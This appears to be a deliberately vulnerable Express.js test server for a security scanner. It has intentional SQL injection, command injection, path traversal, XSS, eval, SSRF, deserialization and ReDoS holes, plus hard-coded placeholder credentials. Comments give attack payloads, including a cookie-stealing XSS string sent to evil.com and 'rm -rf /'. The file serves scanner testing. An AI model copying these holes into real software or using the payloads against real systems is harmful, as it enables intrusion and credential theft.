/**
 * CWE + SECRETS EXPANSION — JavaScript/Node.js
 * ~20 new test cases with explicit reachable/unreachable separation
 *
 * REACHABLE CWEs (called from Express routes):
 *   CWE-89   SQL Injection           /api/search
 *   CWE-78   Command Injection       /api/convert
 *   CWE-22   Path Traversal          /api/download
 *   CWE-79   XSS (Stored)            /api/comments
 *   CWE-94   Code Injection (eval)   /api/eval
 *   CWE-601  Open Redirect           /api/redirect
 *   CWE-918  SSRF                    /api/fetch-url
 *   CWE-1333 ReDoS                   /api/validate-email
 *   CWE-502  Deserialization          /api/restore
 *
 * UNREACHABLE CWEs (dead functions, never called):
 *   CWE-89   SQL Injection           deadSqlQuery()
 *   CWE-78   Command Injection       deadExec()
 *   CWE-94   Code Injection          deadEval()
 *   CWE-918  SSRF                    deadFetch()
 *   CWE-22   Path Traversal          deadFileRead()
 *
 * REACHABLE SECRETS:
 *   AWS Access Key + Secret          /api/s3-upload
 *   Firebase Admin SDK key            /api/push-notification
 *   Twilio credentials                /api/sms
 *   OAuth client secret               /api/oauth-callback
 *
 * UNREACHABLE SECRETS:
 *   Dead AWS key                     deadAwsCall()
 *   Old OAuth secret                 deadOAuthRefresh()
 *   Revoked Mailgun key              deadEmailSend()
 *
 * Copyright © 2026 Sthenos Security. All rights reserved.
 */

const express = require('express');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const serialize = require('node-serialize');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================================
// REACHABLE SECRETS
// ============================================================================

const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
const AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const FIREBASE_SERVER_KEY = "AAAAxxxxxx:APA91bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
const TWILIO_ACCOUNT_SID = "AC32a3c49700934481addd5ce1659f04d2";
const TWILIO_AUTH_TOKEN = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6";
const OAUTH_CLIENT_SECRET = "GOCSpX-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
const MONGODB_URI = "mongodb+srv://admin:MongoPass789!@cluster0.abcde.mongodb.net/production?retryWrites=true";

// ============================================================================
// REACHABLE CWE: SQL Injection (CWE-89)
// Attack: GET /api/search?q='; DROP TABLE products; --
// ============================================================================
app.get('/api/search', (req, res) => {
    const query = req.query.q || '';
    const sqlite3 = require('better-sqlite3');
    const db = new sqlite3(':memory:');
    db.exec('CREATE TABLE IF NOT EXISTS products (id INTEGER, name TEXT, price REAL)');
    // VULNERABLE: String concatenation in SQL
    const sql = `SELECT * FROM products WHERE name LIKE '%${query}%'`;  // CWE-89
    const rows = db.prepare(sql).all();
    res.json({ results: rows });
});

// ============================================================================
// REACHABLE CWE: Command Injection (CWE-78)
// Attack: POST /api/convert with filename="; rm -rf /"
// ============================================================================
app.post('/api/convert', (req, res) => {
    const { filename, format } = req.body;
    // VULNERABLE: User input in shell command
    const output = execSync(`convert ${filename} output.${format}`);  // CWE-78
    res.json({ converted: true, output: output.toString() });
});

// ============================================================================
// REACHABLE CWE: Path Traversal (CWE-22)
// Attack: GET /api/download?file=../../etc/passwd
// ============================================================================
app.get('/api/download', (req, res) => {
    const file = req.query.file || 'readme.txt';
    // VULNERABLE: No path sanitization
    const filePath = path.join('/app/uploads', file);  // CWE-22
    const content = fs.readFileSync(filePath, 'utf8');
    res.send(content);
});

// ============================================================================
// REACHABLE CWE: Stored XSS (CWE-79)
// Attack: POST /api/comments with body=<script>document.location='http://evil.com/'+document.cookie</script>
// ============================================================================
const comments = [];
app.post('/api/comments', (req, res) => {
    const { body, author } = req.body;
    // VULNERABLE: Storing unsanitized HTML
    comments.push({ body, author, date: new Date() });  // CWE-79 stored
    res.json({ saved: true });
});
app.get('/api/comments', (req, res) => {
    // VULNERABLE: Rendering unsanitized HTML
    const html = comments.map(c => `<div><b>${c.author}</b>: ${c.body}</div>`).join('');  // CWE-79
    res.send(`<html><body>${html}</body></html>`);
});

// ============================================================================
// REACHABLE CWE: Code Injection via eval (CWE-94)
// Attack: POST /api/eval with code="process.exit(1)"
// ============================================================================
app.post('/api/eval', (req, res) => {
    const { code } = req.body;
    // VULNERABLE: eval on user input
    const result = eval(code);  // CWE-94
    res.json({ result: String(result) });
});

// ============================================================================
// REACHABLE CWE: Open Redirect (CWE-601)
// Attack: GET /api/redirect?url=https://evil.com/phishing
// ============================================================================
app.get('/api/redirect', (req, res) => {
    const url = req.query.url || '/';
    // VULNERABLE: Unvalidated redirect
    res.redirect(url);  // CWE-601
});

// ============================================================================
// REACHABLE CWE: SSRF (CWE-918)
// Attack: POST /api/fetch-url with url=http://169.254.169.254/latest/meta-data
// ============================================================================
app.post('/api/fetch-url', async (req, res) => {
    const { url } = req.body;
    // VULNERABLE: Server fetches user-supplied URL
    const response = await axios.get(url);  // CWE-918
    res.json({ status: response.status, data: response.data });
});

// ============================================================================
// REACHABLE CWE: ReDoS (CWE-1333)
// Attack: GET /api/validate-email?email=aaaa...@aaa...a
// ============================================================================
app.get('/api/validate-email', (req, res) => {
    const email = req.query.email || '';
    // VULNERABLE: Catastrophic backtracking regex
    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;  // CWE-1333
    const valid = emailRegex.test(email);
    res.json({ valid });
});

// ============================================================================
// REACHABLE CWE: Insecure Deserialization (CWE-502)
// Attack: POST /api/restore with malicious serialized object
// ============================================================================
app.post('/api/restore', (req, res) => {
    const { data } = req.body;
    // VULNERABLE: Deserializing untrusted data
    const obj = serialize.unserialize(data);  // CWE-502
    res.json({ restored: obj });
});

// ============================================================================
// REACHABLE SECRET ENDPOINTS
// ============================================================================

app.post('/api/s3-upload', (req, res) => {
    /** Uses AWS credentials — REACHABLE SECRET */
    const AWS = require('aws-sdk');
    const s3 = new AWS.S3({
        accessKeyId: AWS_ACCESS_KEY_ID,
        secretAccessKey: AWS_SECRET_ACCESS_KEY,
    });
    res.json({ uploaded: true, bucket: 'my-bucket' });
});

app.post('/api/push-notification', (req, res) => {
    /** Uses Firebase server key — REACHABLE SECRET */
    axios.post('https://fcm.googleapis.com/fcm/send', req.body, {
        headers: { 'Authorization': `key=${FIREBASE_SERVER_KEY}` }
    });
    res.json({ pushed: true });
});

app.post('/api/sms', (req, res) => {
    /** Uses Twilio credentials — REACHABLE SECRET */
    const { to, message } = req.body;
    axios.post(
        `https://api.twilio.com/2010-04-01/Accounts/${TWILIO_ACCOUNT_SID}/Messages.json`,
        new URLSearchParams({ To: to, Body: message, From: '+15551234567' }),
        { auth: { username: TWILIO_ACCOUNT_SID, password: TWILIO_AUTH_TOKEN } }
    );
    res.json({ sent: true });
});

app.get('/api/oauth-callback', (req, res) => {
    /** Uses OAuth client secret — REACHABLE SECRET */
    const { code } = req.query;
    axios.post('https://oauth2.googleapis.com/token', {
        code,
        client_id: 'my-client-id',
        client_secret: OAUTH_CLIENT_SECRET,
        grant_type: 'authorization_code'
    });
    res.json({ authenticated: true });
});

// ============================================================================
// ============================================================================
// UNREACHABLE CODE — Functions NEVER called from any route
// ============================================================================
// ============================================================================

function deadSqlQuery() {
    /** UNREACHABLE CWE-89: SQL injection in dead code */
    const sqlite3 = require('better-sqlite3');
    const db = new sqlite3(':memory:');
    const input = "admin";
    db.prepare(`SELECT * FROM users WHERE name = '${input}'`).all();
}

function deadExec() {
    /** UNREACHABLE CWE-78: Command injection in dead code */
    const file = "report.pdf";
    execSync(`cat ${file} | wc -l`);
}

function deadEval() {
    /** UNREACHABLE CWE-94: eval in dead code */
    const expr = "2+2";
    return eval(expr);
}

function deadFetch() {
    /** UNREACHABLE CWE-918: SSRF in dead code */
    const url = "http://internal-service:8080/admin";
    return axios.get(url);
}

function deadFileRead() {
    /** UNREACHABLE CWE-22: Path traversal in dead code */
    const userPath = "../../../etc/shadow";
    return fs.readFileSync(path.join('/app/data', userPath), 'utf8');
}

// ============================================================================
// UNREACHABLE SECRETS — in dead code, never executed
// ============================================================================

function deadAwsCall() {
    /** UNREACHABLE: Old AWS credentials */
    const OLD_AWS_KEY = "AKIAI44QH8DHBEXAMPLE";
    const OLD_AWS_SECRET = "je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY";
    const AWS = require('aws-sdk');
    new AWS.S3({ accessKeyId: OLD_AWS_KEY, secretAccessKey: OLD_AWS_SECRET });
}

function deadOAuthRefresh() {
    /** UNREACHABLE: Revoked OAuth secret */
    const OLD_OAUTH_SECRET = "GOCSpX-REVOKED000000000000000000000";
    axios.post('https://oauth2.googleapis.com/token', {
        client_secret: OLD_OAUTH_SECRET,
        grant_type: 'refresh_token'
    });
}

function deadEmailSend() {
    /** UNREACHABLE: Revoked Mailgun API key */
    const MAILGUN_KEY = "key-3ax6xnjp29jd6fds4gc373sgvjxteol0";
    axios.post('https://api.mailgun.net/v3/example.com/messages', {}, {
        auth: { username: 'api', password: MAILGUN_KEY }
    });
}

// ============================================================================
// START
// ============================================================================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`CWE test server on port ${PORT}`);
});

module.exports = app;
